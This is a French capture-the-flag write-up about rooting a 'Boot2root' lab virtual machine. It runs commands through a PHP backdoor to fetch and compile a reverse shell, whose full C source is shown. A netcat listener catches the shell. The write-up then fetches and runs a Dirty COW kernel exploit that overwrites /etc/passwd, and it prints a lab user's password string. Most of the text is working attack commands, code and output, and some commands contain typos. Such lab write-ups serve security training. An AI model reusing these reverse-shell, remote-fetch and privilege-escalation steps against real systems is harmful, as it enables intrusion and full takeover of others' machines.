# writeup 2

## Reverse shell

On va utiliser notre exploit php pour creer un `reverse shell` et s'introduire dans le server.
Pour cela il va falloir recuperer et compiler un ficher c:

https://192.168.56.102/forum/templates_c/myfile.php?cmd=curl%20https://raw.githubusercontent.com/Gropopus/Boot2root/master/reverse_shell.c%20--output%20reverseshell.c

On curl le fichier c de notre github, pour le mettre dans le dossier /forum/templates_c/, (%20 signifie ' ' pour le navigateur).
```
$ curl https://192.168.56.102/forum/templates_c/myfile.php?cmd=gcc%20reverseshell.c%--output%20reverseshell.c
```
On compile le fichier c pour avoir notre programme.

```
int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr("192.168.122.1"); --->adresse de notre machine
    sa.sin_port = htons(5432); ---> port que l'on devra ecouter.

    s = socket(AF_INET, SOCK_STREAM, 0); ->on creer la socket

    while ((connect(s, (struct sockaddr *)&sa, sizeof(sa))) != 0) ---> le programme va tourner jusqu'a etre connecter a l'addresse de notre marchine hote
        ;
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0); ---> on lance notre shell
    return 0;
}
```

Avant de lancer notre a.out, il faut ecouter sur le port 5432 avec notre machine hote.
On ouvre donc un terminal et on lance netcat: (-l pour listen, -v pour verbose)
```
$ nc -vl 5432
```
On peut maintenant lancer notre a.out sur la page de notre porte dérobée:

https://192.168.56.102/forum/templates_c/myfile.php?cmd=./a.out

et comme par magie, sur notre terminal apparait:
```
Listening on 0.0.0.0 5432
Connection received on e1r13p5.clusters.42paris.fr 55310
$ whoami
www-data
```
Nous avons donc un reverse shell mais nous ne sommes pas encore root.
Pour cela il va falloir faire un autre programme.

## Dirty cow
En lancant la commande uname -r, on peut decouvrir la version du kernel de l'iso:
```
$ uname -r
3.2.0-91-generic-pae
```

Apres quelques recherches sur google, on a fini par trouver un exploit valide pour cette version sur `dirtycow`:

https://github.com/firefart/dirtycow/blob/master/dirty.c

Apres compilation, ce programme creer un user avec les privileges root et defini un mot de passe pour celui-ci.
```
This exploit uses the pokemon exploit of the dirtycow vulnerability
// as a base and automatically generates a new passwd line.
// The user will be prompted for the new password when the binary is run.
// The original /etc/passwd file is then backed up to /tmp/passwd.bak
// and overwrites the root account with the generated line.
// After running the exploit you should be able to login with the newly
// created user.
```

On va donc utiliser notre shell pour curl ce fichier c qu'on a legerement modifié fin que le nouveau user s'appelle root.\
Pour cela, il faut se rapprocher de la racine, apres plusieurs tentatives dans differents dossiers, il s'avere qu'il est possible de curl le fichier dans le repo /tmp
```
$ cd /tmp
$ curl https://raw.githubusercontent.com/Gropopus/Boot2root/master/dirty.c --outpput dirty.c
$ gcc -pthread dirty.c -o dirty -lcrypt
gcc: error trying to exec 'cc1': execvp: No such file or directory
```
Mais surprise ca ne compile pas. On verifie donc les variables de l'env:
```
$ env
...
PWD=/tmp
...
```
Double suprise, il n'y a pas de PATH donc aucun binaire utile au programme n'est trouvé
On ajoute donc la variable PATH et sa valeur a l'env avec un export (les paths sont trouver sur internet -> https://blog.gibbons.digital/hacking/2021/05/04/stuff.html )

```
$ export PATH=/usr/lib/lightdm/lightdm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
$ gcc -pthread dirty.c -o dirty -lcrypt
$ ./dirty
Please enter the new password: youpi
/etc/passwd successfully backed up to /tmp/passwd.bak
iciComplete line:
root:fil.mzz26AR.E:0:0:pwned:/root:/bin/bash

mmap: b7fd9000
ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'root' and the password 'p'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
/etc/passwd successfully backed up to /tmp/passwd.bak
iciComplete line:
root:fil.mzz26AR.E:0:0:pwned:/root:/bin/bash

mmap: b7fd9000
madvise 0

Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'root' and the password 'youpi'.

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd

$ cat /etc/passwd
root:fil.mzz26AR.E:0:0:pwned:/root:/bin/bash
```
On a choisi le password : `youpi`\
Malheureusement, si on lance `su root`, on a le message d'erreur suivant:

```
$ su root
su: must be run from a terminal
```
On se connecte donc avec le compte de laurie en ssh:\
*rappel password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4*

```
$ ssh laurie@192.168.56.102
$ su root
$ whoami
root
```
Voila nous sommes root !!!
